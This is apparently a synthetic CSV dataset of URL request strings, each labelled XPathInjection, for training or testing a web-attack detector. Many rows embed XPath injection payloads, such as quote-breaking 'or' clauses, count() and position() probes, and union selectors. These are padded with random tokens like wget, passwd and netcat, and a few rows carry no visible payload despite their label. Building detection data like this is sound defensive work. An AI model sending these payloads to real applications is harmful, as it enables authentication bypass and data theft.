id,class,vector
20441,XPathInjection,/UlnsodN.swf?8oirdE=rognbia1%27ghwindow.open%3Dd%3Fjrbgsoundeh&BP4VyV32BacceptJ=43031&1ZHMEU4hJPZ=8039397&omDtKM@EiT9=7++++or+++laooa2%2FdE%2F2%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D3%5D++or+++++847%3D&ys3AsiouIh0orhc=7an-deletediv%3D4cyRSityun3%7C&Hmt@j-P7wvgk=3197120&sHnaeGtns=bDislrcrqweenm&gns=1&nenobet=gorittchenqamebt&yecJNpexecD_X4script=972552&tbetnhmnl=Oit%5C&0rta=tsaaik4ck
20477,XPathInjection,/5ecqz0ae4aedt/abHnO9eloeO99b/sat/@P-Hu/rciswcx04BZMvKwf/hnnh2t/o@l/tuTZP/EQJeXXOyF8wE9W/Tmmeviar5e/aYKF8EDfoq.jpg?4WzBXJT5T0includev=zsrYi%27+or+6++++%3C++++count%28path%2Fchild%3A%3A*%29++or+++++%275cdn%27+%3D+++%27&efi=889&iamnpnDto=ex7s&ftpM3E=viae
20485,XPathInjection,/rt1a/aNpqmNtjqzaxSbXd.js?ne1lie=eT%24or3qn-scriptgo&nytdgNgit=gvh%2FSAe%2Fo%2Fchild%3A%3Anode%28%29%5B+++++position%28%29%3D50%5D+++%7C+++kn%2Fhh%2Fig1%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D64%5D+or+++++%273bex%27%3D++%27&1ra=37437&nchvk8hebay=316903
20490,XPathInjection,/rPXc@aN.xDVtu55obFx/sb1UxMZh8PTHhmqxzRNO/Tb0issdlonee2pte/sI/lnx9ootiAtrruhVfrlga/eyo2Edo8H1vlKq/hgIwIyTIb/M0dJnOGkh15S/pR7OKvFoxKlxB6/aeezsnta0/rosBiReiThtsn.shtml?st=6960&goypvi=832&nSt6Crc3on=na%5Di%27fag%295btie&igreprsnqs=ttua7openj&OIws1hbaetteia=oD8ClDZ8Neml&oee=9493284&roBncTroeOs5i=tie&tstsoEornea=so%40a+&yBZLC=464&ihfto4=0485081&seh39=00189++++or+++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+++%7C+path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+or++++0537%3D&xtgail2h=ho%2F%29ormgautoexecolo%2Bap
20498,XPathInjection,5acengyhebeg=738&-VgEVPgYO=t_23.QYutjDA&unionKoa=ran0sTde
20544,XPathInjection,/ncNmochaobjectkRetc/ype0teiYoopbrn/akGGVY7DZ/dz_uRF61t7UdE2f/yw-PhymoayXSxbdO1..png?
20548,XPathInjection,ysgdp=6&b1o7trnntttd=ngLeETiteod&a6uDacienoae=8z.YU_Cj&uidr=44311785&0TieisnThsor=726   or   teso/q15epg/eni/child::node()[position()=2]     or     1363=&1XN3zhwp-Mbk3=oohDX03&nnmimg=ec z8r eanchildboot.ini'cposition &rW@E4L=365&cdewjFlEe=nebernnenC&M@jj@=l@la&mct0rhd91atmHr=61041927&elq= peni&QDkTerk9d=183488&DSUfZ3=l8h6V&lothacpsi=enon8sFtiaantEa
20571,XPathInjection,osolnahwCynt=867&iacgoOnrweg5e=ir&ca=1858141605&erWtda=ngkpsXYr&c1xisto=tipb&connecteLF6Uenph-e=whOMp6SPJ&fKx7@kbR-yS6=ricaeoVs'  or     6     <    count(path/child::*)    or  'p75otrhe'    =    '
20575,XPathInjection,/sock_stream6clogpswget__-4GtmpL@/noesgtGO4rmtu/PEpassthruechoE5UP32o/e1F.3oMxWaWk./smPYjma6RahjWXl6v/dWPk/Py4mh/9fyg0PHhjYnzENqB_@C/vJATz-DI/1hUx.gif?BigtaCnm=03+or+++1%3C+++++s8l0%2Ft%2Fxure1r%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D8%5D+or+++46811%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&cmdRfC7bbodySL=evgmk7o&fmirttg=85818191&GjQ1CTDaIgs=ieri&S9S0CubF=0&uIkenodcchea=sFR-Aiq&OH.V8OEE=2790549788
20597,XPathInjection,/qi8cNhrt9h3uieyogej/a85feqyjeewlnpetsg/connectOEautoexecLEinrpZOV9/chmTW6/chO_3eVhs6Y/hercIsal9ar/aPRSZVuzkHjWDQwziJ/childyGnFSidHgK/alXRflDADW/5jas@k87Cdd/xyO-exec/oosrspha.jpg?tpp7ne3e=un0a&6NFgcat-YqjIJ=846&DagHiHm6TaCatcl=67151&Sh=qlibtnoDA-el&et=edrqnte&j2-GDDe@7Z=517&dc=783820&stUnljessos9gex=no&eisgwnOdsbd=237&retavetjFefe=mailh%7Cnn&tat1ngwaenmp=hLQiXf5XP
20637,XPathInjection,/mOL.wBXEGY2B4ve/oDHhLEdjjtWsJwKuOyhl.jpeg?P19processing-instruction0W64_Q8I=ratlapasswdzarae&i5ZSTYKIu=efhotr%27+++or++++l5nsyS%2Fm0hn%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D91%5D++++or+++%271liT%27++%3D+++%27
20642,XPathInjection,/elTltttSGTs/stp/ia/eaeTafetoswviry/t2Mdxnee/ptLwecAzagrornt5hq9/tqeLeRoNunBsrslT/rcS6Ohecttdx.gif?undr=ixskz&U1UC=30&ba8wibnnjeOdh=mt%2Ft%2Fhlhhvo%2Fchild%3A%3Anode%28%29%5B++position%28%29%3D70%5D++%7C++s%2FnhR%2F70%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D3%5D++++or+++++%27vt%27++++%3D+++%27&defmn9aefl=370789&@cwp-c7updateFKHPH=2eG%3Dtlmaih3&mk9N=12490&wf9ee8llneNa7e=sdr&mRjuVG6x-httpj0=sIHjuA9-w&m0olehh4UC=01365&2nhnr2mssesy=05334
20690,XPathInjection,/dAnf77nVpJ/iQ/c-Fb@BMVWdgrvLbpV2i/se.js?9ttutrlsz=1925436&ttEhk=dlr%27+++++or+++++Ea9%2FotT%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D6%5D++++or+%27aimte%27%3D++%27&aitioiso1yya=iy&ph=heeSrT&Tltlsgntiear=nrew+f&@PSSJNJ983p=3
20709,XPathInjection,rashecAtesMk= rne&s1cecpzh=4tc&Rticims1wka=scu/dwe8Oe/n/child::node()[position()=443] or  'arlne' =    '
20711,XPathInjection,/l9SkHMjopn_/cnk/gJ0oLDjaLo.G8Ij/e5VDZWbqBkdeUOYK/hZyDgvrAew7/seoElrnsitthf/52bn3LET.msf?xhtalz=Ebe&zm803tBRFD=lreeeGfewh5&6eeucessa1aoAhe=eil%2Fy6eeNg%2Fulta%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D334%5D+++or++%27rag%27+++%3D++%27
20723,XPathInjection,/tE64T3v_/rdsuiwdttnytNaXlmpz.jsp?cneebm=6512&9shutdown%upaW6NFP=owJ2Ad89N&7bE=%28i++%3C++count%28mn%2Fchild%3A%3Atext%28%29%29++and+++++j+%3C+count%28iaO%2Fchild%3A%3Acomment%28%29%29++++and+++++k++%3C++++count%28eeu%2Fchild%3A%3A*%29++%29&dX4thameafa7wmr=478&isasff=0dbs&h0anhof2ede=9
20750,XPathInjection,/aRGaREoD/lrlTeiNilSGre3ete/h5RG9hvh0/a5mhhbt/vr.gif?i5mttkrV0Ens=fjni1tr8alnn9algm&oeaeoro=pGX&paff=eAGTWm-i&ttpto3mdsgbTu=%27ioc18bdIwvhtK%5C&npG0dkJM8T=eC7&eshi=ewUTygo6emcae&jltr=jnnxcqu%27+++or+++6+++++%3C+count%28path%2Fchild%3A%3A*%29++or++++%27gueve%27+%3D++%27
20797,XPathInjection,/aRehh94Slm3tbrtitn/r0mAqdio/q9nngFviantye/e2aye/dDR4a/irvunygiy9/nuUUvm/aeqhYp6r7fdqt/ishiReH6/RdTe.shtml?qifxk=708965&1FWnjjEP@c=9325060&lmeduefaptweNQ=ti1%27++or++6++++%3C+count%28path%2Fchild%3A%3A*%29+++or+%27ahzateo%27++++%3D++++%27&Reasttanm=6&Anoe7pn4saheis=amjfn&dk=69&5fdsn0l=266566&BmailimgrC6m=53905&a7rtblrimezek4t=osoe&itne=jxmlreP%24wgetu0attnai&tsVhsud=yehedsa0denefen&eMftifuy@tmp-q=82&sWimgZ_o=laaU01MZO9WK
20837,XPathInjection,/osk/rrLlQZfT1zcr4/8Skid_c.nsf?f.mocha5N83=mjyek&aeso=yakic-oLi%5Ca%27R&tbaNue=13&soteE=9&yhphw=eSuv%27+or++mna%2Fdalt3%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D2%5D+++or+++%27emhuS%27++++%3D+%27&zRDZ3JD2o89=otre9nmutRt&ac4a8n=6677
20841,XPathInjection,tih=354&dsAlthdnwhs=ar8&LnhddixfihvO8=778242443&rjnei8oaut=7074311&aEasrpugrSne=7611226760&ls=a2rnhP&oac81E=701089&tsotpawilsAgrc=lbcov1u&h4hxpot=geeunc 2ce$ec&ci6e=0Vuf-&abodyadmin3siKvarJ1x5=5eNjeaere&lpuetnbejE0a=2&qaPhOl5utn=dxJEIBj1T&rsnIworxsatc=tpasswddropii
20855,XPathInjection,4irw=71  or    1<     se/lndoeg/itr/child::text()[position()=3]     or     43319='] | /* | /foo[bar='
20880,XPathInjection,qtnoihsrts=3767
20883,XPathInjection,/veplet6.png?tsArotrani=xtermobjectk&mirodlt=etAia%27++++or++++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+++or+++%27gtpegia%27+++%3D%27
20885,XPathInjection,/7htEhbnttsipr0aeej/fdlhmnIsuwess3/osagnr7tltrJAiesru.pl?dropsUschildGH=%2Bk&aktieSznhlbr=mhieeehitlfNtEpny&rrgoh=gemsah%27+++or++u3ajm%2Fntady%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D10%5D+++++or++++%27sTuh%27+++%3D%27&en=5%26echoroa++t&dhl=74660&o2yvnstpaas3=olocationnt&EtInNtSt=oeei2&hCnsykI5lrttet=to&tenyesgpt=iqelenmdlfi
20901,XPathInjection,/c.@X4A_/6.g4X2Ndg.sh?becTzzaaatutoE=eeo&8nullwgetaOaLS1=781423&lnlnijdOsu=oGUgzq6ZaWCC&ie1mytyh=4848020&W26TO=%28i+%3C+++count%28eecsa%2Fchild%3A%3Atext%28%29%29+++++and++++j++++%3C++++count%28etrNaa%2Fchild%3A%3Acomment%28%29%29+++and+++k+++%3C+count%28nnl%2Fchild%3A%3A*%29++++%29&ar7p=09203
20939,XPathInjection,/QRiframeprocessing-instructioniFr0SM-4wp/iQ8l7nqhF.hG0_dl5A/yi/eM3kyyokNzEC/ntlziT09befnweg.php3?N0h2vltto=u%29nceihyau&9elrbje32h=iWepWA%40.dBG&fpnz5a=nkoesrecgoiem&t4oeiKi=09&eoooioirmBSha=2677&hNFFKaz=phAsd%2Fw%2Ft%2Fchild%3A%3Anode%28%29%5B++position%28%29%3D066%5D+%7C++au%2FcwBh%2Feon%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D5%5D++++or+++%27nd%27++%3D+++%27&wjBidN=aUtd&tsmere=mhttpnsock_streamtwrhxp_lsib&o3Er2atopn=C4og
20954,XPathInjection,panmee=eytnju_V&E9GRAyUK91=(i  <   count(fuOela/child::text())     and     j <     count(r6/child::comment())    and  k   <    count(vHcis/child::*)  )&0emho=dUK4GiBx1qs&etn=046955&eefae=ns&ntApvea=Tr8srldrt @s
20961,XPathInjection,/sRG6S3H@IU_9X.css?fZGVgconnect53vbscriptAP=caoeA3if%27++or++nin%2Fyo%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D47%5D++++or+++++%27ic2mk7n%27++%3D%27&tdnduilG=8em&9tehqeze6hh=oiAshutdownsps&Iy8an2woCar9=eef7mile&eltnopia=4eeAy01ne
21054,XPathInjection,/fset8t/iUSFT2j.html?waim09tehst=po%27+++or++kNe%2Fe%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D367%5D++++or++%27es60%27+%3D+++%27&2araj=312366214&Foizj=Cgahcs7efiT75Noep
21063,XPathInjection,/teebnglq/uhonv6sytas9teEbee/iQzSupJT-J0.P/tIezroaese8Et/eaAUUjkO/om2Lae/qWY7YOgKHlArU7/h4ra.gif?ewyoeoeEwr=Oe5le%27+or+path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+++or++%27qomcIs2d%27+%3D+++%27
21078,XPathInjection,/_B/iKy/8iQD3Y9.png?oetiw=nEm%2Fouea%2Fsy%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D2%5D++or++%2711hag%27+++%3D++%27&LK_cNf2Lmd1=9ielocationt%286dolma&tliiePdeevh=tr&VaEZpQBS=0175&ol=72&edteuns3ir8=hr-5bhbuaoa&mfctodlrths3be=5030691083&RQb4RN.QK=880873920&NkDfromEthtaccesupdateU=P5qnc&easshtee=ilY4xHzHahhp&-libusystemU=luv&T5ge=s&saae=847745&fjR9btx=killei%3Cifilems+
21084,XPathInjection,/p4w/eeyewrlnpDuSis1ac/0hD48.OSux5Z/i.WxuK16/lP3gnqb..asmx?tdd2aoo=eTkaurTjasirecqau6&ptczOmwiert=682&em5rtletu=8NvEoV&sy64g-jBxyVE=nvaed6rt%26rS+Eqe&srw=nhw6ngx1%27+or++++count%28+path%2Fchild%3A%3Anode%28%29%5Bposition%28+++%29%3D%28%28+i++%2B++++j+++%2B++++k%2B+l++++%2B+1%29%5D++++%7C++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+++or++%27gT%27+++%3D++%27++++faWlna0j%27+++++or&e8=77498&b8gthiNta=m19rfCAH%40I_&e4=aCOa.&aogra=f&grRwxp=guRo
21094,XPathInjection,/iltetEo212e6tctrue/lnnofdrtmGadLsheLr/8Fvbscript/Aoa4ywHTFhtpassfCQ/nwuvMM968poRZB@T/eC1VKoqk4otYc5h/sb/teAti1tL/h2FjCS-6s7laDoS.S/iemh/Mt3h10m.png?mrusO9kr=oEI1dXJ7VN%40&maxlrnra=ozynrdt&MkHlswdv=tyJlmNM&tWxnssue=64&kFB1S@XTfn9=uz%27++++or+++count%28+path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28++i+++%2B+++j+++%2B++++k+%2Bl+%2B+++1%29%5D++++%7C+path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++++or++%27egi%27++++%3D++++%27++++eelTo%27++or&abeo8cf=+rEnrm&lmari=f&itcl=ehcyh&naotifecoefoa=Prv2ad&eojocws2qj4Eww=ml6
21161,XPathInjection,/pPOv8f4wvPX-kRH/admin1/tFtur9V9P/15A/snt1tgxtolntu.dll?Kpassthru5Mp=nph-lgroup+byi4mrcid%27tpst&aligemho=euz&nRgieoim=+eA7e9%5Bizm%5DWn&pjtjnmsfp3LmTtr=iZA%40qC&n7Mas4c=el%7Ceedsw+&v8ee7a=%28i++%3C+++++count%28rsn4d%2Fchild%3A%3Atext%28%29%29+++and++++j++++%3C++++count%28ehcf%2Fchild%3A%3Acomment%28%29%29+++and+++k++%3C+++count%28ag9oab%2Fchild%3A%3A*%29++++%29&teiAon=%3Dlo%29emsnscripte%5D&Tf-nATx=phpkSsn%5Cc5w6i%5Cc+0&fatnaedd5P=umur1eM&uIaoec=documentPferj%24n6eoKoe
21166,XPathInjection,/psiod5wnwaounBxfezie/aLeslh6umse7e/nUf2@FykGb6NNd.sO/p@.css?tg=wda%27%5D+++%7C+++P+%7C++%2F%2Fuser%5B++name%2Ftext%28+++%29%3D%27tqjac&mppceeo=1496598&Eyeanxv=l9Vnh&Fgaireil0h=scriptejhtpassdropt&Xocm=lOgy&maAae=boa9tpm&q7d72gfadmrcf=tulo&86mti8e8yiS=hEim-
21217,XPathInjection,/taqwV6tUt/drKYf2837l.js?xtermQUL2L=3+e4E&gnddmHnam9=%28i+++%3C++++count%28pdeFiT%2Fchild%3A%3Atext%28%29%29+++and+++j+%3C+count%28esnjL%2Fchild%3A%3Acomment%28%29%29+and++++k+++%3C++count%28ssErs%2Fchild%3A%3A*%29+++++%29
21223,XPathInjection,/3VeJrEDl9iG/i-rQCNbDsl.ih5yM3/thk4JuSUaD.jpg?sg=ehperl&oi=%3DiPlxetl5&OLoo7antavsh=5283&hayrnLiuxaarsa=r8TcE&e8eh1=yAhEgi%27++or+8hS%2Fnbjfe%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D99%5D+++or++++%27sren%27++++%3D+++%27&zorran=ctadminchy6fot3oa&ftHesydjco=147&PFzj=nir02d
21225,XPathInjection,/toxrtsqs9oQ4ohop/ad9HO/eofAs1ihie3s8ioaqsu/0AsRnth6/a9eoeoioI.exe?OFCU=%28i+++++%3C++count%28LOdhor%2Fchild%3A%3Atext%28%29%29+++++and+++j+++%3C+++++count%28car%2Fchild%3A%3Acomment%28%29%29+++and+++++k+++%3C+++++count%28jseuv%2Fchild%3A%3A*%29+++%29&isc1ctci=%2Bletei4e&3rrddohs6h=ti%24loy0ii&EkiG.P_DU4bv=0oa&pjsh8ah=uR8gmQwm60B
21234,XPathInjection,foquh=496896&4opdoit5nlrN6t=5i76demeutD&se0eeih2wya=wacedatorno&ML32inputh7_opth6=ioliorEhneegee&EO=zReeon1tr&4gybgaenijuwar=fI-bZfAVFKV&xzqnts3=57   or     count(path/child::node()[position()=((i+j+k+l+1)]   |   path/child::*()[position()=(k+1)])=1   or     330=&osd=teprocessing-instruction;h&JyUlikeRP1rZgT-=hne1ecta&eerf=ISaeDtmcIid&6o&3sfgCrtw=pne\passwdrrnrdenrh|&du19tjielt0=lVWHI&e2=Cpanae&HV0HWk=2245829&nrio=ro
21244,XPathInjection,/cFHlntilsfiti4eLnetV.jpeg?2Jgjib=rWu1%40rTUPt_X&q9NtelnetCpC3=oovKtph7aM&ahh=Whi
21252,XPathInjection,/2r.jpg?i0kepr8kn=99460299&On=%28i+++%3C+++count%28pwo%2Fchild%3A%3Atext%28%29%29++++and+j+%3C++count%28dnAq%2Fchild%3A%3Acomment%28%29%29+and++++k+%3C+++++count%28pndrnC%2Fchild%3A%3A*%29++%29&qrkikt=8215734&oadgnahs=nncfd&ehjdmmrtgic=8182441&mnmgxrfTbbfroe=5
21272,XPathInjection,uny6hNlt=l9nNql s eev&ehtbstuiL0ih=eeFYy&JJe@D.=lv&E55uLtmpb2x_ti=tod&2senite7=0sock_streamYo |Is%ua4esua&iCZ9=0o&faEoS5iyyi=uth r&sitnsq9ah=lI_xhs&pc1telnet_pQA=83&leaizhstets2=e1iefenia&_CZp=458&u6ku=mghE&2T=aYi8D6@FUfor&smgfe3=d
21276,XPathInjection,/I@L1/qUKQ/8NSOdQE/PZ/wartiRo0yopaOe/H7JQfAshutdownXmetaaprocessing-instructionma/oaOr1tugasNito/nstcre2i0ngdrs2rns/J5ZBL3/Hwaoirrensse.htm?oueeeoordan=insertturLescriptxtermmochah&cyfhsock_streamUZ=sg&hWsmwR=systemd&BscriptYd73sdropT=trpMhha%27+or++++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D++++or+%27et%27+%3D%27&el0eh=oechothnetcat+hf1Ccxeelh&xNIlsb.s=a.REJC&wner7I=w%29s7&ul=tvnaohavinggiooe1U
21314,XPathInjection,/5T__iSFhhD/etsstsghwdnNet4T/2_m2Qgj6K5S9J/betweentpUibnUe9y-./uQWcGXYpIoARZYMxv/reurnleerlWtpgp.cfm?eHGq=27789809&gqyteeblnEoi0=itgrde%27+or+++M%2Feo%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D931%5D+++++or+%27asqdf%27+++%3D++%27&rt9s=3hinitlikeseuuRs2votydocumenttt&s36yisolo3w=0278163&etbuakeeee=kzleg2ohSt8rAt0n&eerEwa8E=exec4n6ooo&ien=k%26%264m+2leg
21322,XPathInjection,/qwXkyyj@fNMA/ntee7/u1drcamrseootartCiRa/m5prsuenraeepxeei/etausmehisOoma1e/tylo-PfE9b44Rsy/d4MfnIGVhl8pb71l/oX0ifz/@KCXdwgetB-qvNV/i6EG/Jdmailq8b@droptOGJnvr/otteja.cfm?ttAndmdd5Ie9=uJlt85&achudojs3nRJh=ttcatsH&isoeLulsXe=974++or++++e%2Fl7igRh%2Fsw3Tr%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D58%5D+or+++++9393%3D&W5pW=ai5irr2&ttrtecu=ge2E&aeintgun=sUVH_
21325,XPathInjection,/lpzrAyRHR1gG@a/0h-%uzWbNd_jU/oneittasncxkst/edae2/hen8lttilhth/hWeAHky0QRE6.cc.r6wI/khEo4ii7hg/lu/e8PfZ.jpeg?b0KpQN=xp_4iv&3tQvandN=Weenamijw&p4@s=091&ruaeta=tpfsimTTthf&ridfna=lzsC&aettualDsr=303&onUtozf8et2=%24tmpav6+0b9auz+a&deaAtter7re=f%24l-%5Be&hikthe0uAa=t3kRRXm&Tee89djhncbbqa4=lXdre&N-HXI2=erd_f&50ag7noaAdrs5Ih=946&heto7d=aup9mstdint+%24&ieterflmyee=sorz%2Fk%2Fielrv%2Fchild%3A%3Anode%28%29%5B+++++position%28%29%3D4%5D+++%7C++++weio%2Fsewad%2F1aoos4%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D48%5D++or+%27oi%27+%3D++++%27&SoedA2bTyXF=voi4fKale
21345,XPathInjection,/m4t/yz8awtloocslaawjEyi/ibK/s6r2sfnrsem/0GVqRP8unionBTF..tiff?ttEe9lormzor=oa&gLwindow.openo=eval%7Ebodyn3&ntaeI3srksr2t=orlnc6htltin&ljgr=copytnCi&w6dliwmletam=fYgBe5Hqh&rei=enceMuyet+arpositionpositionE&wWTh=ewD8blEzYFD3&Qeciayaido=me0cueedmtsri&c9Kqncmd3SBD1log=649056&mYFkGutRx6A=fservicesorQhttpsprocessing-instructionaMdr+aedorl&hce=mx%27++++or+6++%3C++count%28path%2Fchild%3A%3A*%29++or+%27inornUie%27+++%3D++%27&YI0BHUWK0=sFIbiS&nahea=%3AnpassthrubHOBLc5%7E5eau8tr&twr0e=hs
21367,XPathInjection,/ioeypQynB9/omeseFswmcj0df/eub/VmCsVNKQjDadmin1n5c/shutdownroRfkCNin-/t4s/r@LXfMU/eZ.s/2rtULgDfDwdJwk6ldy/nxSYLeNNr1fY-/srw9jNlxzys7d.html?awn=5023783230&sblEi9GafnNiuuc=912&ioheStatidItu=78&enunnaTgmgis=60676641&ssRqHdSoEthae=+-ohc&0dInmhes=esNlcUo%27%5D+++++%7C++++P++%7C++++%2F%2Fuser%5B++++name%2Ftext%28+++%29+++%3D+++%27enns&6rNsdtenrt=8371&hiemayqamyNt=9481&q1Sr=btaEaoEltrctt&vdgrreeenhc=61720&a3Q77mv=007705&sheaetvdh=stiframeh&nSte=texecer+edprocessing-instruction%3C%26t%25y%5BW
21371,XPathInjection,/rIC57aJ/saolh4resedeecdtefu/lsoSwnvybEus5eo/las/xke5odarihial44rPfut/htleex81v/ht.dll?wasw3roiyeh=edskaeM%3CcatinahttpssUen1&1GQQWKz=rKArre&3IqaoeeemmpfS=2ojs%5C&rtqac3t3riyim=cRE0KM_hoa&ini=647069&OSArR8object0d08V=Jipol4&rntsb=aoha7sOnoazl&Idsh=73390&ad=mrs6s%2FE%2Fsie1od%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D530%5D+++++or++%27weScdgoE%27+++%3D++%27
21379,XPathInjection,/b0CdL_OyJ0V/ehF/nypNOwd/LJyPZJT.jpeg?sEgtt=r0R51aaOn&hroetY39ujh=rhJSn7&elggr=in70nLuNmocha9rheTlmonull9q%29&nLfriau6eueciaj=awinntye%2FduR
21397,XPathInjection,/n7M/oreoarlrAb7igjirn/iPl8mXA8pF6C1938V-/dte/hFZEgfC5HIwO2K@/RnRBlbSeXwWE/Hr4_VeF0GKEinput.mdb?elulsepot8t=hm2dsqesz1mc&srr=%27t48c0access_log%40+l%28It&zNHZpune=4&ius6l6sdodgm=tv1P&tn6e=015&access_logKiframehu@paccess_loggZ=500318&ot45noTDio=+ainclude%5Cl+sam%5Ba3%3F2%7ChT%26Bni5&z7terysfnwhdae=3oebg4%27+++or+++a%2FrA5Nnr%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D08%5D+++or+++++%27ycw%27++%3D++%27&dpsmeee=r_PENg&oihnTsftg=lpasswdeF&I6ngg_NmEecho=aeecd
21430,XPathInjection,/7vCpW7estyledG/pida/m8K87E.G0VxV3/esenbIhaohaN6gielaeg/iib9yB3T42T.php4?hk=6fByvvl-&sv=357&nwhedNnf=4erm5ds&doo9=udlaitehthm4l&ew=e0gyeEaiSuowe2&5rsehsn=gen5do9&ch=6&selectaTGSYWBGHmscript=trra&eopeLossaoittr=arhieotsreanoainserts+&e0aeaseesae7=79584738&zT0lP0d=exec92eb&cms=9459733&stti0scao5=kQrQHm1WBx9&nanburrUa=g2tetfcvar5&1dSa=rftoolime
21462,XPathInjection,/xN_zQoG/uw/f_gVPAJsd/iNssnt/adzIlfI3AN5IvfQ/oYqVEu9q86yL51/6u341IrNE/nge.js?xnra5mr5wS=anaahhic%27++or+++++%28i+++%3C++++count%28cedt%2Fchild%3A%3Atext%28%29%29+++++and++++j+%3C++++count%287nsobe%2Fchild%3A%3Acomment%28%29%29+++++and+++++k++++%3C++count%28ae%2Fchild%3A%3A*%29+++%29++or+++%27teelmy2%27%3D++++%27++gixh%27+++or&aiahdie58ttN=e2SheraioutOtnqanw&cmRolgdb=9380968&lrar=86306
21471,XPathInjection,/7eenMR0cabtee/Eii2/eZj/zDFFW98EH5l@4/aEflej06udHafoSohE/.DHGZ.swf?zeAcQtwq=qSreeaQvo&3ti=01891+++++or++++1%3C+++meopy%2Fi%2FSdyl%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D494%5D++++or+543%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27
21501,XPathInjection,eog=u7onTm' or  count( path/child::node()[position(    )=((   i  +    j    +k   + l+    1)]     |    path/child::*()[position()=(k+1)])=1     or  'oih'    =  '    o7ekto'  or&nh0y=]Natmptgymi\eftpat  &aebg=neiantkidieSfnnb&ae4Es4arn=-d&nrreiBsmapathtr=so9rtod9hgnhM4&hnhlStgtl2au=rw&cN2uhoits=06530368&Aedn5fhe=fJ6m73GrT&At=e'57ohen2sslid
21644,XPathInjection,/pTloits3o80p3pvd/oavbioen4b376tnt3abr/iLjjgh9V0QApwSJ/exQUf5CbN-@z94.htm?
21663,XPathInjection,/K8k8MWqr.nsf?guavlibh=bmTeMlQz1J1H&yiSN=69
21669,XPathInjection,/uOpF.KUAkox/evHpQ7tCQmjaaSx/uu7dAinvzMb/5DgltBrduhtvecahtoo/ioreyuilt/uT2mJe@@cE/ifdccesrsitnOoa/Letoy6F7FytrWdbPoIo6/t4yIsDKwscmvb8/zZrbrXQfaXEr79VH1CFr/5itcsa.htm?qcnEcg3winii=hgd3t1ef%7E9ausystemt&tt-UJ=+rprr%28+U5g&lsjsxyeate=9ex%27+or+++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28++%29%3D%28%28++++i+++%2Bj++%2B++k%2B+l++++%2B++++1%29%5D+++%7C+path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++++or+++%27nuyaad4%27%3D+++%27+++sebrtuOb%27+++++or&0eet=mfIrwtxxzepUiN&S5dhne8=05811&3iotIaissbcgp=sAZ33cYa%40xy&tmh1qr55an81ti=n.2%40Vu4p&esuawqsbl3hl6=6pimebih&pve5ct=eooee4eh&argg=eEm&5tAdcnsfaeeiei=ry0sswsh6asjI&40ncU=+oh9stn7Sc&ehhsm8oylo=10
